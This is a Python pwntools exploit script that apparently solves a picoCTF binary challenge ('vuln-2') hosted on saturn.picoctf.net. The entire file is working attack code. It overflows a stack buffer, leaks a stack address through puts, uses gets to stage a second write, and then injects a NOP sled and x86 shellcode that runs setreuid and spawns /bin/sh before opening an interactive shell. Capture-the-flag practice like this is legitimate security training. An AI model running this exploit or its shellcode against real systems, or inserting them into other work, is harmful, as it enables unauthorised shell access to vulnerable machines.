from pwn import *

context(terminal=['tmux','new-window'])

local, debug = False, False

shellcode = b"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

fname = './vuln-2'
# saturn.picoctf.net 63008
host, port = 'saturn.picoctf.net', 52318
r = process(fname) if local else remote(host, port)
p = ELF(fname)

def title():
	log.info(r.recvline())

def send_exploit(payload):
	log.info('sending malicious payload')
	r.sendline(payload)

if __name__=='__main__':
	target = p.sym['__libc_stack_end']
	call_gets = 0x08049dc4
	call_puts = p.sym['puts']
	pop_ebx_ret = 0x080b22bf
	main = 0x8049dd5
	title()
	if debug: gdb.attach(r,'')
	send_exploit(b'a'*28+p32(call_puts)+p32(main)+p32(target))
	out= u32(r.recvline()[:4])
	log.info('leaked stack = {}'.format(hex(out)))
	
	title()
	send_exploit(p32(out)*7+p32(call_gets)+p32(out)*4)

	send_exploit(b'\x90'*4+p32(out+8)+b'\x90'*8+shellcode)	
	r.interactive()
	





